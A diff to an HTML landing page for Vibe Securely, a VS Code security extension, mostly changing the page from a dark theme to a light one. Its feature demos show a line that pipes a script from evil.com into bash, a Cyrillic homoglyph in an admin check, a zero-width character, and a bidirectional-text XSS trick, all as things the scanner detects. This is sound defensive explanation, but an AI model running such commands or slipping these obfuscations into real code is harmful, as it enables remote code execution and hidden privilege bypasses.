@@ -9,13 +9,13 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #0D1117;
-            color: #c9d1d9;
+            background-color: #f8fafc;
+            color: #1e293b;
         }
         .glass-card {
-            background: rgba(34, 41, 51, 0.6);
+            background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.1);
         }
         .cta-button {
             transition: all 0.3s ease;
@@ -25,12 +25,12 @@
             box-shadow: 0 10px 15px -3px rgba(34, 197, 94, 0.1), 0 4px 6px -2px rgba(34, 197, 94, 0.05);
         }
         .feature-tab {
-            background-color: transparent;
-            border: 1px solid #30363d;
+            background-color: #e2e8f0;
+            border: 1px solid transparent;
         }
         .feature-tab.active {
             background-color: #22c55e;
-            color: #0D1117;
+            color: white;
             border-color: #22c55e;
         }
         .code-highlight {
@@ -41,7 +41,7 @@
         }
         .timeline-item .timeline-dot {
             transition: all 0.3s ease;
-            background-color: #30363d;
+            background-color: #cbd5e1;
         }
         .timeline-item.active .timeline-dot {
             transform: scale(1.5);
@@ -57,8 +57,9 @@
             opacity: 1;
         }
         .pricing-card {
-            background-color: #161b22;
-            border: 1px solid #30363d;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -1px rgba(0,0,0,0.03);
         }
         .pricing-card.highlight {
             border-color: #22c55e;
@@ -67,7 +68,7 @@
     </style>
 </head>
 <body class="antialiased">
-    <!-- Chosen Palette: Vatrion Dark Theme (Dark Grey, Teal, Light Grey) -->
+    <!-- Chosen Palette: Vatrion Light Theme (White, Green, Dark Slate) -->
     <!-- Application Structure Plan: A linear, scrolling landing page designed to guide the user through a compelling narrative. The structure is: Hero (immediate value proposition), Features (interactive demonstration of capabilities), Roadmap (building future interest), Pricing (clear value tiers), and a final CTA. This single-flow structure is optimal for a marketing one-pager, as it logically moves from awareness to consideration to action without distractions. Interactivity in the Features and Roadmap sections turns passive reading into active engagement, making the product's value more tangible. -->
     <!-- Visualization & Content Choices: 
         - Hero Animation: Goal: Create a modern, techy vibe. Presentation: A subtle canvas animation of moving particles. Interaction: Passive visual engagement. Justification: Sets a professional tone without needing heavy image assets. Method: Vanilla JS Canvas API.
@@ -77,31 +78,31 @@
     <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
 
     <div class="relative overflow-hidden">
-        <canvas id="hero-canvas" class="absolute top-0 left-0 w-full h-full z-0 opacity-10"></canvas>
+        <canvas id="hero-canvas" class="absolute top-0 left-0 w-full h-full z-0 opacity-20"></canvas>
         
         <header class="absolute top-0 left-0 right-0 z-10 p-4">
             <div class="container mx-auto flex justify-between items-center">
-                <img src="logo.jpg" alt="Vatrion Logo" class="h-8 w-auto">
-                <a href="#pricing" class="hidden md:inline-block bg-green-500 text-slate-900 font-semibold py-2 px-4 rounded-lg shadow-md hover:bg-green-400 cta-button">Join Waitlist</a>
+                <img src="logo.jpg" alt="Vatrion Logo" class="h-24 w-auto">
+                <a href="#pricing" class="hidden md:inline-block bg-green-500 text-white font-semibold py-2 px-4 rounded-lg shadow-md hover:bg-green-600 cta-button">Join Waitlist</a>
             </div>
         </header>
 
         <main class="relative z-10">
             <section id="hero" class="min-h-screen flex items-center justify-center text-center px-4 pt-20 pb-12">
                 <div class="max-w-3xl">
-                    <span class="inline-block bg-gray-800 border border-gray-700 text-green-400 text-sm font-semibold px-3 py-1 rounded-full mb-4">FOR VS CODE & COMPATIBLE EDITORS</span>
-                    <h2 class="text-4xl md:text-6xl font-extrabold text-slate-100 mb-6 leading-tight">Proactive Security For Your IDE</h2>
-                    <p class="text-lg md:text-xl text-slate-400 max-w-2xl mx-auto mb-8">Vibe Securely detects malicious commands and Unicode obfuscation in your code, helping you prevent supply chain attacks before they happen.</p>
-                    <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="bg-green-500 text-slate-900 font-bold py-3 px-8 rounded-lg shadow-lg text-lg hover:bg-green-400 cta-button">Join The Waitlist</a>
+                    <span class="inline-block bg-green-100 text-green-800 text-sm font-semibold px-3 py-1 rounded-full mb-4">FOR VS CODE & COMPATIBLE EDITORS</span>
+                    <h2 class="text-4xl md:text-6xl font-extrabold text-slate-900 mb-6 leading-tight">Proactive Security For Your IDE</h2>
+                    <p class="text-lg md:text-xl text-slate-600 max-w-2xl mx-auto mb-8">Vibe Securely detects malicious commands and Unicode obfuscation in your code, helping you prevent supply chain attacks before they happen.</p>
+                    <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="bg-green-500 text-white font-bold py-3 px-8 rounded-lg shadow-lg text-lg hover:bg-green-600 cta-button">Join The Waitlist</a>
                     <p class="text-slate-500 text-sm mt-4">Free to use. No account, email, or credit card required.</p>
                 </div>
             </section>
             
-            <section id="features" class="py-20 bg-slate-900 border-y border-slate-800">
+            <section id="features" class="py-20 bg-white border-y border-slate-200">
                 <div class="container mx-auto px-4">
                     <div class="text-center max-w-2xl mx-auto mb-12">
-                        <h3 class="text-3xl md:text-4xl font-bold text-slate-100 mb-4">Find Hidden Threats, Instantly</h3>
-                        <p class="text-slate-400 text-lg">Our real-time scanner actively protects you from common and sophisticated obfuscation techniques. See how it works.</p>
+                        <h3 class="text-3xl md:text-4xl font-bold text-slate-900 mb-4">Find Hidden Threats, Instantly</h3>
+                        <p class="text-slate-600 text-lg">Our real-time scanner actively protects you from common and sophisticated obfuscation techniques. See how it works.</p>
                     </div>
 
                     <div class="max-w-4xl mx-auto">
@@ -112,37 +113,37 @@
                             <button data-feature="bidi" class="feature-tab py-2 px-4 rounded-lg font-semibold transition">Bidirectional Text</button>
                         </div>
 
-                        <div id="feature-content" class="glass-card rounded-xl p-4 md:p-8">
+                        <div id="feature-content" class="glass-card rounded-xl p-4 md:p-8 shadow-lg">
                             <div id="deny-content" class="feature-pane">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Known Malicious Commands</h4>
-                                <p class="text-slate-400 mb-4">Vibe Securely flags commands from a configurable deny list, catching suspicious script executions immediately.</p>
-                                <pre class="bg-slate-900 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="deny-code" class="language-bash">npm install
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Known Malicious Commands</h4>
+                                <p class="text-slate-600 mb-4">Vibe Securely flags commands from a configurable deny list, catching suspicious script executions immediately.</p>
+                                <pre class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="deny-code" class="language-bash">npm install
 curl -sL https://evil.com/install.sh | bash
 npm run build
 </code></pre>
                             </div>
                             <div id="homoglyph-content" class="feature-pane hidden">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Unicode Homoglyphs</h4>
-                                <p class="text-slate-400 mb-4">Attackers can swap characters with visually identical ones from different scripts. We spot the difference so you don't have to.</p>
-                                <pre class="bg-slate-900 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="homoglyph-code" class="language-javascript">const user = await findUserByUsername('admin');
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Unicode Homoglyphs</h4>
+                                <p class="text-slate-600 mb-4">Attackers can swap characters with visually identical ones from different scripts. We spot the difference so you don't have to.</p>
+                                <pre class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="homoglyph-code" class="language-javascript">const user = await findUserByUsername('admin');
 if (user.isАdmin) { // The 'A' is Cyrillic
   grantSuperuserPrivileges();
 }
 </code></pre>
                             </div>
                             <div id="invisible-content" class="feature-pane hidden">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Invisible Characters</h4>
-                                <p class="text-slate-400 mb-4">Zero-width spaces and other invisible characters can be used to hide malicious code in plain sight. We make them visible.</p>
-                                <pre class="bg-slate-900 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="invisible-code" class="language-javascript">if (is_production) {
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Invisible Characters</h4>
+                                <p class="text-slate-600 mb-4">Zero-width spaces and other invisible characters can be used to hide malicious code in plain sight. We make them visible.</p>
+                                <pre class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="invisible-code" class="language-javascript">if (is_production) {
   // This looks safe, but has a zero-width space
   run_prod_task();‍
 }
 </code></pre>
                             </div>
                             <div id="bidi-content" class="feature-pane hidden">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Bidirectional Control Characters</h4>
-                                <p class="text-slate-400 mb-4">Special characters can reverse the order of text, making a harmless-looking command execute something dangerous.</p>
-                                <pre class="bg-slate-900 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="bidi-code" class="language-bash"># This command appears to echo "safe"
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Bidirectional Control Characters</h4>
+                                <p class="text-slate-600 mb-4">Special characters can reverse the order of text, making a harmless-looking command execute something dangerous.</p>
+                                <pre class="bg-slate-800 text-slate-300 p-4 rounded-lg text-sm overflow-x-auto"><code id="bidi-code" class="language-bash"># This command appears to echo "safe"
 echo "access-control: GREEN /*" LRI RLI LRI "*/ alert('XSS');" PDI
 </code></pre>
                             </div>
@@ -157,111 +158,111 @@ echo "access-control: GREEN /*" LRI RLI LRI "*/ alert('XSS');" PDI
             <section id="roadmap" class="py-20">
                 <div class="container mx-auto px-4">
                     <div class="text-center max-w-2xl mx-auto mb-16">
-                        <h3 class="text-3xl md:text-4xl text-slate-100 font-bold mb-4">Our Release Roadmap</h3>
-                        <p class="text-slate-400 text-lg">We're just getting started. Vibe Securely is actively evolving to bring you more powerful security tools.</p>
+                        <h3 class="text-3xl md:text-4xl text-slate-900 font-bold mb-4">Our Release Roadmap</h3>
+                        <p class="text-slate-600 text-lg">We're just getting started. Vibe Securely is actively evolving to bring you more powerful security tools.</p>
                     </div>
 
                     <div class="max-w-4xl mx-auto">
                         <div class="relative">
-                            <div class="absolute top-1/2 left-0 w-full h-0.5 bg-slate-800 -translate-y-1/2"></div>
+                            <div class="absolute top-1/2 left-0 w-full h-0.5 bg-slate-300 -translate-y-1/2"></div>
                             <div class="relative flex justify-between">
                                 <div id="timeline-item-today" class="timeline-item text-center w-1/3 active">
                                     <div class="timeline-dot-wrapper flex justify-center">
                                         <div class="timeline-dot relative w-4 h-4 rounded-full cursor-pointer"></div>
                                     </div>
-                                    <p class="mt-4 font-semibold text-slate-200">Today</p>
+                                    <p class="mt-4 font-semibold text-slate-800">Today</p>
                                 </div>
                                 <div id="timeline-item-3m" class="timeline-item text-center w-1/3">
                                     <div class="timeline-dot-wrapper flex justify-center">
                                         <div class="timeline-dot relative w-4 h-4 rounded-full cursor-pointer"></div>
                                     </div>
-                                    <p class="mt-4 font-semibold text-slate-200">3 Months</p>
+                                    <p class="mt-4 font-semibold text-slate-800">3 Months</p>
                                 </div>
                                 <div id="timeline-item-6m" class="timeline-item text-center w-1/3">
                                     <div class="timeline-dot-wrapper flex justify-center">
                                         <div class="timeline-dot relative w-4 h-4 rounded-full cursor-pointer"></div>
                                     </div>
-                                    <p class="mt-4 font-semibold text-slate-200">6 Months</p>
+                                    <p class="mt-4 font-semibold text-slate-800">6 Months</p>
                                 </div>
                             </div>
                         </div>
 
                         <div class="mt-12 min-h-[180px]">
-                            <div id="timeline-content-today" class="timeline-content active glass-card rounded-lg p-6 text-center">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Functioning Free Extension</h4>
-                                <p class="text-slate-400">The core Vibe Securely experience is live and available today, offering powerful real-time detection for malicious commands and Unicode obfuscation. Ready to install and use immediately.</p>
+                            <div id="timeline-content-today" class="timeline-content active glass-card rounded-lg p-6 text-center shadow-md">
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Functioning Free Extension</h4>
+                                <p class="text-slate-600">The core Vibe Securely experience is live and available today, offering powerful real-time detection for malicious commands and Unicode obfuscation. Ready to install and use immediately.</p>
                             </div>
-                            <div id="timeline-content-3m" class="timeline-content glass-card rounded-lg p-6 text-center">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Pro Tier Public Beta</h4>
-                                <p class="text-slate-400">Introducing dependency vulnerability tracking. Get notified of outdated, vulnerable packages in your project's manifest. Pro users will get email alerts and AI-powered "Fix Prompts" to guide mitigation.</p>
+                            <div id="timeline-content-3m" class="timeline-content glass-card rounded-lg p-6 text-center shadow-md">
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Pro Tier Public Beta</h4>
+                                <p class="text-slate-600">Introducing dependency vulnerability tracking. Get notified of outdated, vulnerable packages in your project's manifest. Pro users will get email alerts and AI-powered "Fix Prompts" to guide mitigation.</p>
                             </div>
-                             <div id="timeline-content-6m" class="timeline-content glass-card rounded-lg p-6 text-center">
-                                <h4 class="text-xl font-bold text-slate-100 mb-2">Pro Production & Premium Launch</h4>
-                                <p class="text-slate-400">The Pro tier exits beta with a full production release. We will also introduce the Premium tier, including all Pro features with support for more projects and an expanded suite of advanced security checks.</p>
+                             <div id="timeline-content-6m" class="timeline-content glass-card rounded-lg p-6 text-center shadow-md">
+                                <h4 class="text-xl font-bold text-slate-900 mb-2">Pro Production & Premium Launch</h4>
+                                <p class="text-slate-600">The Pro tier exits beta with a full production release. We will also introduce the Premium tier, including all Pro features with support for more projects and an expanded suite of advanced security checks.</p>
                             </div>
                         </div>
                     </div>
                 </div>
             </section>
             
-            <section id="pricing" class="py-20 bg-slate-900 border-y border-slate-800">
+            <section id="pricing" class="py-20 bg-white border-y border-slate-200">
                  <div class="container mx-auto px-4">
                     <div class="text-center max-w-2xl mx-auto mb-12">
-                        <h3 class="text-3xl md:text-4xl text-slate-100 font-bold mb-4">Choose Your Vibe</h3>
-                        <p class="text-slate-400 text-lg">Start for free today and sign up to get notified about our upcoming Pro and Premium tiers.</p>
+                        <h3 class="text-3xl md:text-4xl text-slate-900 font-bold mb-4">Choose Your Vibe</h3>
+                        <p class="text-slate-600 text-lg">Start for free today and sign up to get notified about our upcoming Pro and Premium tiers.</p>
                     </div>
 
                     <div class="grid md:grid-cols-3 gap-8 max-w-5xl mx-auto">
                         <div class="pricing-card rounded-xl p-8 flex flex-col">
-                            <h4 class="text-2xl font-bold text-slate-100 mb-2">Free</h4>
-                            <p class="text-slate-400 mb-6">Essential protection, forever free.</p>
-                            <div class="text-4xl font-bold text-slate-100 mb-6">
+                            <h4 class="text-2xl font-bold text-slate-900 mb-2">Free</h4>
+                            <p class="text-slate-500 mb-6">Essential protection, forever free.</p>
+                            <div class="text-4xl font-bold text-slate-900 mb-6">
                                 $0
                             </div>
-                            <ul class="space-y-3 text-slate-400 mb-8 flex-grow">
+                            <ul class="space-y-3 text-slate-600 mb-8 flex-grow">
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Real-time Scanning</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Deny List Matching</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Unicode Obfuscation Detection</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Configurable Settings</li>
                             </ul>
-                            <button class="w-full bg-slate-700 text-slate-200 font-bold py-3 px-6 rounded-lg transition hover:bg-slate-600">Available Now</button>
+                            <button class="w-full bg-slate-100 text-slate-800 font-bold py-3 px-6 rounded-lg transition hover:bg-slate-200">Available Now</button>
                         </div>
                         <div class="pricing-card highlight rounded-xl p-8 flex flex-col relative">
                              <div class="absolute top-0 -translate-y-1/2 left-1/2 -translate-x-1/2">
-                                <span class="bg-green-500 text-slate-900 text-xs font-bold px-3 py-1 rounded-full uppercase">COMING SOON</span>
+                                <span class="bg-green-500 text-white text-xs font-bold px-3 py-1 rounded-full uppercase">COMING SOON</span>
                             </div>
-                            <h4 class="text-2xl font-bold text-slate-100 mb-2">Pro</h4>
-                            <p class="text-slate-400 mb-6">For professionals and teams.</p>
-                            <div class="text-4xl font-bold text-slate-100 mb-6">
+                            <h4 class="text-2xl font-bold text-slate-900 mb-2">Pro</h4>
+                            <p class="text-slate-500 mb-6">For professionals and teams.</p>
+                            <div class="text-4xl font-bold text-slate-900 mb-6">
                                 TBD
                             </div>
-                             <ul class="space-y-3 text-slate-400 mb-8 flex-grow">
+                             <ul class="space-y-3 text-slate-600 mb-8 flex-grow">
                                 <li class="flex items-center"><span class="font-bold text-green-500 mr-3">✓</span>All Free Features, plus:</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Dependency Vulnerability Tracking</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Vulnerability Email Alerts</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>AI-Powered Fix Prompts</li>
                             </ul>
-                            <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="w-full bg-green-500 text-slate-900 font-bold py-3 px-6 rounded-lg transition hover:bg-green-400 cta-button">Join Pro Waitlist</a>
+                            <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="w-full bg-green-500 text-white font-bold py-3 px-6 rounded-lg transition hover:bg-green-600 cta-button">Join Pro Waitlist</a>
                         </div>
                         <div class="pricing-card rounded-xl p-8 flex flex-col">
-                            <h4 class="text-2xl font-bold text-slate-100 mb-2">Premium</h4>
-                            <p class="text-slate-400 mb-6">For enterprise-grade security.</p>
-                            <div class="text-4xl font-bold text-slate-100 mb-6">
+                            <h4 class="text-2xl font-bold text-slate-900 mb-2">Premium</h4>
+                            <p class="text-slate-500 mb-6">For enterprise-grade security.</p>
+                            <div class="text-4xl font-bold text-slate-900 mb-6">
                                 TBD
                             </div>
-                            <ul class="space-y-3 text-slate-400 mb-8 flex-grow">
+                            <ul class="space-y-3 text-slate-600 mb-8 flex-grow">
                                 <li class="flex items-center"><span class="font-bold text-green-500 mr-3">✓</span>All Pro Features, plus:</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Increased Project Limits</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Additional Security Checks</li>
                                 <li class="flex items-center"><span class="text-green-500 mr-3">✓</span>Priority Support</li>
                             </ul>
-                            <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="w-full bg-slate-700 text-slate-200 font-bold py-3 px-6 rounded-lg transition hover:bg-slate-600">Get Notified</a>
+                            <a href="https://www.vatrion.com/" target="_blank" rel="noopener noreferrer" class="w-full bg-slate-100 text-slate-800 font-bold py-3 px-6 rounded-lg transition hover:bg-slate-200">Get Notified</a>
                         </div>
                     </div>
                  </div>
             </section>
 
-             <footer class="py-8">
+             <footer class="py-8 bg-slate-50">
                 <div class="container mx-auto px-4 text-center text-slate-500">
                     <p>&copy; 2025 Vibe Securely by Vatrion. All rights reserved.</p>
                 </div>
@@ -410,5 +411,4 @@ echo "access-control: GREEN /*" LRI RLI LRI "*/ alert('XSS');" PDI
     </script>
 </body>
 </html>
-
 
